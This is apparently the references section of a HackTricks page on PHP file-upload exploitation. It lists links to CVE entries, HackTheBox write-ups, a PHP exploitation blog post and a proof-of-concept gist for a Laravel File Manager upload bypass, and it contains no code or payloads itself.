- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
